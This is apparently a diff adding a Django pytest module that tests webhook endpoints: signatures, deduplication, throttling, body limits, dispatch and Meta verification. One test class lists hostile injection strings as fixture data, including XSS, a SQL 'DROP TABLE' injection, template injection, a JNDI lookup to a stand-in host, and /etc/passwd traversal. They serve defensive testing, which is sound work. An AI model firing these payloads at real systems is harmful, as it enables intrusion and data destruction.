@@ -1,0 +1,465 @@
+"""The webhook endpoints, end to end (SPEC §7.1, SECURITY-BASELINE §§2, 4, 7).
+
+Driven through a real adapter (``fake_adapter.py``) registered in the real
+registry, so what these tests exercise is the actual path a delivery takes:
+
+    endpoint → size cap → ban → signature → dedup → event log → dispatch seam
+
+Mocking the adapter would prove the endpoint calls something; this proves the
+framework works.
+"""
+
+import json
+import threading
+import time
+from typing import Any
+
+import pytest
+from django.db import connection as db_connection
+from django.test import Client
+from django.test.utils import override_settings
+from django.urls import reverse
+
+from apps.channels import ingest
+from apps.channels.models import ChannelConnection, WebhookEventLog, WebhookEventStatus
+from apps.channels.tests.fake_adapter import SECRET_HEADER, SIGNATURE_HEADER, registered, sign
+from apps.common.platforms import Platform
+
+pytestmark = pytest.mark.django_db
+
+TELEGRAM_URL = "/webhooks/telegram/"
+
+
+def body_for(*event_ids: str, text: str = "hello") -> bytes:
+    events = [{"id": event_id, "user": "u1", "text": text} for event_id in event_ids]
+    return json.dumps({"events": events}).encode()
+
+
+def post(client: Client, url: str, body: bytes, *, secret: str, signature: str | None = None) -> Any:
+    """A delivery signed the way a correctly configured platform would sign it."""
+    headers = {SECRET_HEADER: secret, SIGNATURE_HEADER: signature or sign(secret, body)}
+    return client.post(url, data=body, content_type="application/json", headers=headers)
+
+
+@pytest.fixture
+def collected() -> list[Any]:
+    """A processor registered on the contract-6 seam, collecting what it is given."""
+    received: list[Any] = []
+
+    def processor(conn: ChannelConnection, events: Any) -> None:
+        received.extend(events)
+
+    ingest.register_processor(processor, name="test-collector")
+    return received
+
+
+class TestHappyPath:
+    def test_a_valid_delivery_is_logged_and_dispatched(
+        self, client: Client, connection: ChannelConnection, secret: str, fake_adapter: Any, collected: list[Any]
+    ) -> None:
+        response = post(client, TELEGRAM_URL, body_for("e1"), secret=secret)
+
+        assert response.status_code == 200
+        row = WebhookEventLog.objects.get()
+        assert row.connection == connection
+        assert row.provider_event_id == "e1"
+        assert row.status == WebhookEventStatus.PROCESSED
+        assert row.processed_at is not None
+        assert row.raw == {"id": "e1", "user": "u1", "text": "hello"}
+        assert [event.provider_event_id for event in collected] == ["e1"]
+
+    def test_several_events_in_one_delivery_all_land(
+        self, client: Client, secret: str, fake_adapter: Any, collected: list[Any]
+    ) -> None:
+        response = post(client, TELEGRAM_URL, body_for("a", "b", "c"), secret=secret)
+        assert response.status_code == 200
+        assert WebhookEventLog.objects.count() == 3
+        assert len(collected) == 3
+
+    def test_no_csrf_token_is_required(self, connection: ChannelConnection, secret: str, fake_adapter: Any) -> None:
+        """The signature is the credential; there is no session to protect."""
+        strict = Client(enforce_csrf_checks=True)
+        assert post(strict, TELEGRAM_URL, body_for("e1"), secret=secret).status_code == 200
+
+    def test_a_valid_delivery_answers_within_100ms(
+        self, client: Client, secret: str, fake_adapter: Any, collected: list[Any]
+    ) -> None:
+        # One warm-up so connection setup and template/URL caches are not being
+        # measured, then the best of three: the assertion is about the code
+        # path's cost, not about CI's worst scheduling moment.
+        post(client, TELEGRAM_URL, body_for("warm"), secret=secret)
+        timings = []
+        for index in range(3):
+            start = time.perf_counter()
+            response = post(client, TELEGRAM_URL, body_for(f"t{index}"), secret=secret)
+            timings.append(time.perf_counter() - start)
+            assert response.status_code == 200
+        assert min(timings) < 0.1, f"fastest of three was {min(timings):.3f}s"
+
+
+class TestDeduplication:
+    def test_a_repeated_delivery_is_processed_once(
+        self, client: Client, secret: str, fake_adapter: Any, collected: list[Any]
+    ) -> None:
+        for _ in range(3):
+            assert post(client, TELEGRAM_URL, body_for("e1"), secret=secret).status_code == 200
+
+        assert WebhookEventLog.objects.count() == 1
+        assert len(collected) == 1
+
+    def test_a_partly_repeated_batch_processes_only_the_new_events(
+        self, client: Client, secret: str, fake_adapter: Any, collected: list[Any]
+    ) -> None:
+        post(client, TELEGRAM_URL, body_for("a"), secret=secret)
+        post(client, TELEGRAM_URL, body_for("a", "b"), secret=secret)
+        assert sorted(WebhookEventLog.objects.values_list("provider_event_id", flat=True)) == ["a", "b"]
+        assert [event.provider_event_id for event in collected] == ["a", "b"]
+
+    def test_an_event_without_an_id_is_not_logged(
+        self, client: Client, secret: str, fake_adapter: Any, collected: list[Any]
+    ) -> None:
+        # The fake adapter drops these while parsing, which is the contract:
+        # an event with no id cannot be deduplicated.
+        body = json.dumps({"events": [{"user": "u1", "text": "hi"}]}).encode()
+        assert post(client, TELEGRAM_URL, body, secret=secret).status_code == 200
+        assert WebhookEventLog.objects.count() == 0
+
+
+@pytest.mark.django_db(transaction=True)
+class TestConcurrentDelivery:
+    def test_simultaneous_duplicates_process_exactly_once(self) -> None:
+        """The acceptance criterion. The unique constraint is what makes it true."""
+        from tests.support import create_tenancy
+
+        tenancy = create_tenancy("concurrent")
+        connection = ChannelConnection(
+            workspace=tenancy.workspace,
+            platform=Platform.TELEGRAM,
+            display_name="Bot",
+            external_id="concurrent-bot",
+        )
+        secret = connection.rotate_webhook_secret()
+        connection.save()
+
+        dispatched: list[str] = []
+        lock = threading.Lock()
+
+        def processor(conn: ChannelConnection, events: Any) -> None:
+            with lock:
+                dispatched.extend(event.provider_event_id for event in events)
+
+        ingest.register_processor(processor, name="concurrent-collector")
+
+        workers = 8
+        # Released together, so the inserts genuinely race rather than queueing.
+        barrier = threading.Barrier(workers)
+        statuses: list[int] = []
+
+        def deliver() -> None:
+            try:
+                barrier.wait(timeout=10)
+                response = post(Client(), TELEGRAM_URL, body_for("race"), secret=secret)
+                with lock:
+                    statuses.append(response.status_code)
+            finally:
+                # Each thread opened its own connection; a transactional test
+                # leaves them behind otherwise and the next test blocks on
+                # TRUNCATE.
+                db_connection.close()
+
+        try:
+            with registered(Platform.TELEGRAM):
+                threads = [threading.Thread(target=deliver) for _ in range(workers)]
+                for thread in threads:
+                    thread.start()
+                for thread in threads:
+                    thread.join(timeout=30)
+
+            assert statuses == [200] * workers
+            assert WebhookEventLog.objects.filter(connection=connection).count() == 1
+            assert dispatched == ["race"]
+        finally:
+            ingest.unregister_processor("concurrent-collector")
+            WebhookEventLog.objects.all().delete()
+            connection.delete()
+            tenancy.workspace.delete()
+            tenancy.organization.delete()
+
+
+class TestSignatureFailures:
+    def test_a_wrong_signature_is_403_and_writes_nothing(self, client: Client, secret: str, fake_adapter: Any) -> None:
+        response = post(client, TELEGRAM_URL, body_for("e1"), secret=secret, signature="sha256=" + "0" * 64)
+        assert response.status_code == 403
+        assert WebhookEventLog.objects.count() == 0
+
+    def test_a_missing_signature_is_403(self, client: Client, secret: str, fake_adapter: Any) -> None:
+        response = client.post(
+            TELEGRAM_URL,
+            data=body_for("e1"),
+            content_type="application/json",
+            headers={SECRET_HEADER: secret},
+        )
+        assert response.status_code == 403
+
+    def test_an_unknown_connection_answers_exactly_like_a_bad_signature(
+        self, client: Client, secret: str, fake_adapter: Any
+    ) -> None:
+        """No existence oracle: the two cases must be indistinguishable."""
+        body = body_for("e1")
+        unknown = post(client, TELEGRAM_URL, body, secret="not-a-real-secret")
+        bad_signature = post(client, TELEGRAM_URL, body, secret=secret, signature="sha256=" + "0" * 64)
+
+        assert unknown.status_code == bad_signature.status_code == 403
+        assert unknown.content == bad_signature.content
+
+    def test_a_disabled_connection_stops_ingesting_on_the_shared_route(
+        self, client: Client, connection: ChannelConnection, secret: str, fake_adapter: Any
+    ) -> None:
+        """Switching a channel off has to actually switch it off."""
+        connection.status = "disabled"
+        connection.save(update_fields=["status"])
+        assert post(client, TELEGRAM_URL, body_for("e1"), secret=secret).status_code == 403
+        assert WebhookEventLog.objects.count() == 0
+
+    def test_a_disabled_connection_stops_ingesting_on_a_per_connection_route(
+        self, client: Client, connection: ChannelConnection
+    ) -> None:
+        with registered(Platform.SMS):
+            sms = ChannelConnection(
+                workspace=connection.workspace,
+                platform=Platform.SMS,
+                display_name="Number",
+                external_id="+15551234",
+                status="disabled",
+            )
+            sms_secret = sms.rotate_webhook_secret()
+            sms.save()
+            url = reverse("webhook_sms", kwargs={"connection_id": sms.pk})
+            assert post(client, url, body_for("e1"), secret=sms_secret).status_code == 403
+
+    def test_an_unknown_connection_id_is_403_not_404(self, client: Client, fake_adapter: Any) -> None:
+        with registered(Platform.SMS):
+            url = reverse("webhook_sms", kwargs={"connection_id": "11111111-1111-1111-1111-111111111111"})
+            assert post(client, url, body_for("e1"), secret="anything").status_code == 403
+
+
+class TestThrottle:
+    @override_settings(WEBHOOK_SIGNATURE_FAILURE_LIMIT=3)
+    def test_repeated_failures_get_the_source_banned(self, client: Client, secret: str, fake_adapter: Any) -> None:
+        body = body_for("e1")
+        for _ in range(4):
+            assert post(client, TELEGRAM_URL, body, secret=secret, signature="sha256=bad").status_code == 403
+
+        banned = post(client, TELEGRAM_URL, body, secret=secret)
+        assert banned.status_code == 429
+        assert banned["Retry-After"]
+
+    @override_settings(WEBHOOK_SIGNATURE_FAILURE_LIMIT=3)
+    def test_a_valid_delivery_never_counts_toward_the_ban(
+        self, client: Client, secret: str, fake_adapter: Any, collected: list[Any]
+    ) -> None:
+        for index in range(10):
+            assert post(client, TELEGRAM_URL, body_for(f"e{index}"), secret=secret).status_code == 200
+
+
+class TestBodyLimits:
+    @override_settings(WEBHOOK_MAX_BODY_BYTES=64)
+    def test_an_oversized_body_is_rejected_before_any_database_work(
+        self, client: Client, secret: str, fake_adapter: Any, django_assert_num_queries: Any
+    ) -> None:
+        body = json.dumps({"events": [{"id": "e1", "user": "u1", "text": "x" * 500}]}).encode()
+        with django_assert_num_queries(0):
+            response = post(client, TELEGRAM_URL, body, secret=secret)
+        assert response.status_code == 413
+
+    @override_settings(WEBHOOK_MAX_JSON_DEPTH=5)
+    def test_a_nesting_bomb_is_rejected(self, client: Client, secret: str, fake_adapter: Any) -> None:
+        body = b'{"events":' + b"[" * 500 + b"]" * 500 + b"}"
+        assert post(client, TELEGRAM_URL, body, secret=secret).status_code == 400
+
+    def test_a_body_that_is_not_json_is_400(self, client: Client, secret: str, fake_adapter: Any) -> None:
+        assert post(client, TELEGRAM_URL, b"not json at all", secret=secret).status_code == 400
+        assert WebhookEventLog.objects.count() == 0
+
+
+class TestHostilePayloads:
+    """Every field is attacker-controlled (SECURITY-BASELINE §2)."""
+
+    INJECTIONS = [
+        "<script>alert(1)</script>",
+        "'; DROP TABLE channels_channel_connection; --",
+        "{{ 7*7 }}",
+        "${jndi:ldap://evil.test/x}",
+        "../../../../etc/passwd",
+        "\x00\x01\x02",
+        "👩‍💻" * 50,
+        "%s%s%s%n",
+    ]
+
+    @pytest.mark.parametrize("injection", INJECTIONS)
+    def test_injection_strings_survive_as_plain_data(
+        self, client: Client, secret: str, fake_adapter: Any, collected: list[Any], injection: str
+    ) -> None:
+        body = json.dumps({"events": [{"id": injection, "user": injection, "text": injection}]}).encode()
+        response = post(client, TELEGRAM_URL, body, secret=secret)
+
+        assert response.status_code == 200
+        row = WebhookEventLog.objects.get()
+        # Stored verbatim, interpreted by nothing. Escaping is the renderer's
+        # job, and Django templates autoescape by default. The one exception is
+        # NUL, which PostgreSQL will not store at all — see security.scrub_nulls.
+        assert row.provider_event_id == injection.replace("\x00", "")[:200]
+        assert collected[0].payload.text == injection
+
+    @pytest.mark.parametrize(
+        "payload",
+        [
+            {},
+            {"events": None},
+            {"events": "not a list"},
+            {"events": [None, 1, "two", []]},
+            {"events": [{"id": 1, "user": 2}]},  # wrong types
+            {"events": [{"id": "", "user": ""}]},  # empty strings
+            {"events": [{"id": "ok", "user": "u", "text": {"nested": "object"}}]},
+            {"events": [{"id": "ok", "user": "u", "extra": [1, 2, 3]}]},
+            {"unexpected": "key"},
+        ],
+    )
+    def test_a_malformed_payload_never_5xxs(
+        self, client: Client, secret: str, fake_adapter: Any, payload: dict[str, Any]
+    ) -> None:
+        response = post(client, TELEGRAM_URL, json.dumps(payload).encode(), secret=secret)
+        assert response.status_code == 200
+
+    def test_an_oversized_raw_payload_is_truncated_in_the_log(
+        self, client: Client, secret: str, fake_adapter: Any
+    ) -> None:
+        body = json.dumps({"events": [{"id": "e1", "user": "u1", "text": "x" * 20000}]}).encode()
+        assert post(client, TELEGRAM_URL, body, secret=secret).status_code == 200
+        assert WebhookEventLog.objects.get().raw == {"_truncated": True, "_bytes": pytest.approx(20040, abs=200)}
+
+    def test_a_nul_byte_does_not_500_the_endpoint(
+        self, client: Client, secret: str, fake_adapter: Any, collected: list[Any]
+    ) -> None:
+        """PostgreSQL refuses NUL outright, so an unscrubbed one is a 500 — and a
+        platform answered with 5xx retries the same body until it gives up on
+        the webhook entirely."""
+        body = json.dumps({"events": [{"id": "e\u00001", "user": "u\u00001", "text": "hi\u0000there"}]}).encode()
+        response = post(client, TELEGRAM_URL, body, secret=secret)
+
+        assert response.status_code == 200
+        assert WebhookEventLog.objects.get().provider_event_id == "e1"
+
+    def test_a_parser_that_raises_does_not_5xx(
+        self, client: Client, secret: str, fake_adapter: Any, monkeypatch: Any
+    ) -> None:
+        def explode(self: Any, request: Any, conn: Any) -> Any:
+            raise RuntimeError("adapter bug")
+
+        monkeypatch.setattr(fake_adapter, "parse_events", explode)
+        assert post(client, TELEGRAM_URL, body_for("e1"), secret=secret).status_code == 200
+
+
+class TestDispatchSeam:
+    def test_no_processor_registered_is_a_no_op(self, client: Client, secret: str, fake_adapter: Any) -> None:
+        """The state this issue ships in: logged, dropped, 200."""
+        assert post(client, TELEGRAM_URL, body_for("e1"), secret=secret).status_code == 200
+        assert WebhookEventLog.objects.get().status == WebhookEventStatus.PROCESSED
+
+    def test_a_processor_that_raises_marks_the_event_failed_but_still_200s(
+        self, client: Client, secret: str, fake_adapter: Any
+    ) -> None:
+        def explode(conn: Any, events: Any) -> None:
+            raise RuntimeError("persistence is down")
+
+        ingest.register_processor(explode, name="exploder")
+        response = post(client, TELEGRAM_URL, body_for("e1"), secret=secret)
+
+        assert response.status_code == 200
+        assert WebhookEventLog.objects.get().status == WebhookEventStatus.FAILED
+
+    def test_processors_run_in_registration_order(self, client: Client, secret: str, fake_adapter: Any) -> None:
+        order: list[str] = []
+        ingest.register_processor(lambda c, e: order.append("first"), name="first")
+        ingest.register_processor(lambda c, e: order.append("second"), name="second")
+        post(client, TELEGRAM_URL, body_for("e1"), secret=secret)
+        assert order == ["first", "second"]
+
+    def test_one_failing_processor_does_not_stop_the_next(self, client: Client, secret: str, fake_adapter: Any) -> None:
+        reached: list[str] = []
+
+        def explode(conn: Any, events: Any) -> None:
+            raise RuntimeError("boom")
+
+        ingest.register_processor(explode, name="exploder")
+        ingest.register_processor(lambda c, e: reached.append("yes"), name="after")
+        post(client, TELEGRAM_URL, body_for("e1"), secret=secret)
+        assert reached == ["yes"]
+
+
+class TestNoAdapter:
+    def test_a_platform_with_no_adapter_answers_503(self, client: Client, secret: str) -> None:
+        """The shipped state for every platform. Retryable, and not a 403."""
+        response = post(client, "/webhooks/whatsapp/", body_for("e1"), secret=secret)
+        assert response.status_code == 503
+
+    def test_an_unknown_platform_is_404(self, client: Client) -> None:
+        assert client.post("/webhooks/carrier-pigeon/", data=b"{}", content_type="application/json").status_code == 404
+
+
+class TestMetaVerification:
+    URL = "/webhooks/instagram/"
+
+    @override_settings(PLATFORM_CREDENTIALS_FROM_ENV={"instagram": {"verify_token": "let-me-in"}})
+    def test_the_challenge_is_echoed_for_the_right_token(self, client: Client) -> None:
+        response = client.get(
+            self.URL,
+            {"hub.mode": "subscribe", "hub.verify_token": "let-me-in", "hub.challenge": "1158201444"},
+        )
+        assert response.status_code == 200
+        assert response.content == b"1158201444"
+        assert response["X-Content-Type-Options"] == "nosniff"
+
+    @override_settings(PLATFORM_CREDENTIALS_FROM_ENV={"instagram": {"verify_token": "let-me-in"}})
+    def test_a_wrong_token_is_403(self, client: Client) -> None:
+        response = client.get(
+            self.URL,
+            {"hub.mode": "subscribe", "hub.verify_token": "guess", "hub.challenge": "1158201444"},
+        )
+        assert response.status_code == 403
+
+    @override_settings(PLATFORM_CREDENTIALS_FROM_ENV={"instagram": {"verify_token": "let-me-in"}})
+    def test_the_wrong_mode_is_403(self, client: Client) -> None:
+        response = client.get(
+            self.URL,
+            {"hub.mode": "unsubscribe", "hub.verify_token": "let-me-in", "hub.challenge": "1"},
+        )
+        assert response.status_code == 403
+
+    @override_settings(PLATFORM_CREDENTIALS_FROM_ENV={"instagram": {"verify_token": "let-me-in"}})
+    @pytest.mark.parametrize("challenge", ["<script>alert(1)</script>", "", "abc", "1" * 100])
+    def test_only_a_short_numeric_challenge_is_echoed(self, client: Client, challenge: str) -> None:
+        """Reflecting arbitrary caller-supplied content is not a thing to offer."""
+        response = client.get(
+            self.URL,
+            {"hub.mode": "subscribe", "hub.verify_token": "let-me-in", "hub.challenge": challenge},
+        )
+        assert response.status_code == 403
+
+    @override_settings(PLATFORM_CREDENTIALS_FROM_ENV={})
+    def test_an_unconfigured_platform_404s(self, client: Client) -> None:
+        """The /internal/tick discipline: no token means the endpoint is not there."""
+        response = client.get(
+            self.URL,
+            {"hub.mode": "subscribe", "hub.verify_token": "anything", "hub.challenge": "1"},
+        )
+        assert response.status_code == 404
+
+
+class TestMethods:
+    def test_get_is_not_allowed_on_a_per_connection_route(self, client: Client, connection: ChannelConnection) -> None:
+        url = reverse("webhook_sms", kwargs={"connection_id": connection.pk})
+        assert client.get(url).status_code == 405
+
+    def test_put_is_not_allowed_on_the_shared_route(self, client: Client) -> None:
+        assert client.put(TELEGRAM_URL, data=b"{}", content_type="application/json").status_code == 405
